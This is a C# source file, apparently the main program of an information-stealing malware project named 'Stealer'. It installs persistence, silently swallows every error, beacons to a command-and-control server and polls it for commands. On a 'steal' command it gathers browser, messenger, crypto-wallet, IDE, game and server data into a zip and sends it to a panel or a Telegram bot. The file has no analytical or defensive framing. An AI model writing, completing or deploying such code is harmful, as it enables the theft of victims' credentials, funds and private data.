using System;
using System.Threading;
using System.Threading.Tasks;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        private static readonly int HeartbeatInterval = 25000;
        private static readonly int CommandPollInterval = 10000;
        private static string _clientId;

        static void Main(string[] args)
        {
            try
            {
                Config.Initialize();
                _clientId = Environment.MachineName + "_" + Environment.UserName;

                try { Persistence.Install(); } catch { }

                var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
                heartbeatThread.Start();

                CommandLoop();
            }
            catch { }

            while (true) { Thread.Sleep(60000); }
        }

        private static void HeartbeatLoop()
        {
            while (true)
            {
                try { C2Client.SendHeartbeat(_clientId); } catch { }
                Thread.Sleep(HeartbeatInterval);
            }
        }

        private static void CommandLoop()
        {
            while (true)
            {
                try
                {
                    string cmd = null;
                    try { cmd = C2Client.PollCommand(_clientId); } catch { }

                    if (!string.IsNullOrEmpty(cmd))
                    {
                        HandleCommand(cmd);
                    }
                }
                catch { }
                Thread.Sleep(CommandPollInterval);
            }
        }

        private static void HandleCommand(string command)
        {
            switch (command.ToLower().Trim())
            {
                case "steal":
                    RunStealer();
                    break;
                case "uninstall":
                    try { Persistence.Uninstall(); } catch { }
                    Environment.Exit(0);
                    break;
            }
        }

        private static void RunStealer()
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    SystemInfoCollector.Collect(zip);
                    ChromiumCollector.Collect(zip);
                    GeckoCollector.Collect(zip);
                    MessengersCollector.Collect(zip);
                    CryptoCollector.Collect(zip);
                    IDECollector.Collect(zip);
                    GamesCollector.Collect(zip);
                    ServersCollector.Collect(zip);

                    if (zip.Count == 0) return;

                    byte[] zipData = zip.ToArray();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                    else
                    {
                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                }
            }
            catch { }
        }
    }
}
